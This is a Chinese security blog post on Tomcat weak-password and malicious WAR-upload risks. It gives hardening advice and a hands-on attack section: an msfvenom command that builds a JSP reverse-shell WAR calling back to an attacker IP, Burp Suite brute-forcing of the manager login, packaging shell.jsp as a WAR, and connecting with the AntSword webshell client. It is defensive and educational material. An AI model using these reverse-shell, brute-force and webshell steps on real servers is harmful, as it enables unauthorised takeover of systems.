#  Tomcat弱口令+War包漏洞防护   
原创 小话安全  小话安全   2025-03-03 09:38  
  
Tomcat弱口令和WAR包漏洞是常见的Apache Tomcat服务器安全问题，可能导致未授权访问或远程代码执行。以下是详细分析和防御建议：  
  
一、Tomcat弱口令漏洞  
  
漏洞原理  
  
- Tomcat默认提供管理界面（如`/manager/html`和`host-manager`），若管理员未修改默认密码或使用简单密码（如`tomcat:tomcat`、`admin:admin`），攻击者可暴力破解登录管理后台。  
  
攻击流程  
  
1. 扫描发现Tomcat管理界面（默认端口8080）。  
  
2. 使用弱口令尝试登录`/manager/html`。  
  
3. 上传恶意WAR包并部署，获取服务器控制权。  
  
 防御措施  
  
1. 修改默认密码  
  
   编辑`tomcat-users.xml`，设置复杂密码并仅授权必要角色：  
  
<user username="admin" password="StrongPassword@123" roles="manager-gui,admin-gui"/>  
  
   - 避免使用`manager-script`等高权限角色。  
  
2. 限制管理界面访问  
  
   - 通过`server.xml`限制访问IP：  
  
<Valve className= "org.apache.catalina.valves.RemoteAddrValve"  allow="192.168.1.0/24"/>  
  
   - 或禁用管理界面（删除`webapps`目录下的`manager`和`host-manager`）。  
  
3. 启用账户锁定机制   
  
   配置`FailedLoginAttempts`防止暴力破解。  
  
二、WAR包漏洞  
  
漏洞原理  
  
- 攻击者通过管理界面上传恶意WAR文件（如包含JSP木马或反弹Shell代码），Tomcat会自动解压并部署为Web应用。  
  
- WAR包中的恶意代码可执行任意系统命令，导致服务器沦陷。  
  
攻击流程  
  
1. 生成恶意WAR包：  
  
     
msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击者IP LPORT=4444 -f war > shell.war  
  
2. 通过管理界面上传并部署`shell.war`。  
  
3. 访问`http://目标IP:8080/shell/`触发恶意代码，获取反向Shell。  
  
防御措施  
  
以下是Tomcat安全加固的总结，涵盖关键配置、权限管理、漏洞防护和监控措施，帮助提升Tomcat服务器的安全性：  
  
一、基础安全加固  
  
1. 版本升级   
  
   - 使用Tomcat 最新稳定版本（如Tomcat 10.x/9.x），修复已知漏洞（如CVE-2020-1938 Ghostcat文件读取漏洞）。  
  
   - 定期检查Apache官方安全公告：[Tomcat Security Advisories](https://tomcat.apache.org/security.html)  
  
2. 最小化安装    
  
   - 删除默认示例和文档：    
  
       rm -rf /tomcat/webapps/docs /examples /host-manager /manager  
  
   - 关闭未使用的协议（如AJP协议）：    
  
   
  编辑`server.xml`，注释或删除`<Connector port="8009" protocol="AJP/1.3" ... />`。  
  
3. 禁用自动部署    
  
   防止攻击者通过文件系统直接部署恶意应用：    
  
<Host name="localhost" appBase="webapps" unpackWARs="true" autoDeploy="false">  
  
二、权限与认证加固  
  
1. 修改默认密码    
  
   - 编辑`tomcat-users.xml`，设置复杂密码并限制角色权限：    
  
     <user username="admin" password="Zxcv@2023!%$" roles="manager-gui,admin-gui" />  
  
   - 禁用高权限角色（如`manager-script`、`manager-jmx`）。  
  
2. 限制管理界面访问    
  
   - 仅允许特定IP访问管理后台（`/manager/html`和`/host-manager`）：    
  
      <!-- 在server.xml的对应<Context>中添加 -->  
  
<Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="192.168.1.0/24" />  
  
   - 或直接删除管理界面（移除`webapps/manager`和`webapps/host-manager`目录）。  
  
3. 启用账户锁定机制  
  
   配置登录失败次数限制（需结合`FailedLoginAttempts`模块或使用第三方安全组件）。  
  
三、文件与目录权限  
  
1. 限制Tomcat运行权限   
  
   - 创建专用低权限用户运行Tomcat：    
  
     useradd -M -s /sbin/nologin tomcat_user  
  
     chown -R tomcat_user:tomcat_user /opt/tomcat  
  
   - 禁止Tomcat用户拥有`sudo`权限或写入系统关键目录的权限。  
  
2. 配置文件权限  
  
   - 设置敏感文件为只读（如`conf/*.xml`、`bin/*.sh`）：    
  
        chmod 640 /opt/tomcat/conf/server.xml  
  
3. 日志文件保护   
  
   - 确保日志目录（`logs/`）不可被Web访问，定期归档并监控异常日志（如暴力破解、部署行为）。  
  
攻击实战  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0LTz7Lex94UrAVl0gfBNDhia54jQicnpxdgGiav2Ta7I0cibFwJsofp9NibDFXk9KAhapVYya4wO8Sat5TFUKoaAhKg/640?wx_fmt=png&from=appmsg "")  
  
使用burpsuit进行爆破  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0LTz7Lex94UrAVl0gfBNDhia54jQicnpxdmiaGTLiaUTkic3HLPhl312YxST6QCJUD50CXWEIr5bJtfrSQiavta2MxVQ/640?wx_fmt=png&from=appmsg "")  
  
设置 Payload type 为 Custom iterator,在 Position 1 的位置添加用户名:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0LTz7Lex94UrAVl0gfBNDhia54jQicnpxdxnOLD0bs0p11mCpnT0ic8Suo3iccIkr9N08OR8YhJtHtoicqXRqZ2cSOA/640?wx_fmt=png&from=appmsg "")  
  
在 Position 2 的位置添加“：”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0LTz7Lex94UrAVl0gfBNDhia54jQicnpxdVAsF631j4jTtu5tMmXPz8VgG4lutPRiaR2ZTBf01KyQ5dsg46MyhqyA/640?wx_fmt=png&from=appmsg "")  
  
在 Position 3 的位置添加密码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0LTz7Lex94UrAVl0gfBNDhia54jQicnpxdHsmWvnqDf7Ks0EBmegRFhkbZiaPWFXnrT3nkSLflhgLSB9ibtdzkMx2A/640?wx_fmt=png&from=appmsg "")  
  
在 Payload Processing 处设置为 Base64 编码,并且取消勾选 Url Encoding  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0LTz7Lex94UrAVl0gfBNDhia54jQicnpxdjfZiapRzfARLK2Lu9NY3ePfyoBXkicaJvRRWjzHLJgWXfeh959WicYyXw/640?wx_fmt=png&from=appmsg "")  
  
爆破成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0LTz7Lex94UrAVl0gfBNDhia54jQicnpxdTpHhVlUhwJ6tBloLctsDJic1c7E9pib8hWj7yghJBl7P7QgdyvpianMeQ/640?wx_fmt=png&from=appmsg "")  
  
成功登录后，攻击者可直接上传恶意WAR包，接管服务器。  
  
将 shell.jsp 马打包成 war 包  
  
```
jar -cvf shell.war shell.jsp
```  
  
  
或者使用 zip 压缩成 war 包  
```
zip shell.war shell.jsp
```  
  
进入登录界面,部署上传  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/0LTz7Lex94UrAVl0gfBNDhia54jQicnpxd2HianMd2TWqKWBf9V149POHe25MbOUblgg9tOsxITCEZicg2hsrZUtyQ/640?wx_fmt=jpeg "")  
  
4.中国蚁剑连接  
  
连接位置为 http://yourip:port/Login/shell.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0LTz7Lex94UrAVl0gfBNDhia54jQicnpxdaRHN9cJfjcibqbvOoRtQqOM2x5QEhM2apOXj2zV9fefxiaLVOHyxqTDA/640?wx_fmt=png&from=appmsg "")  
  
  
  
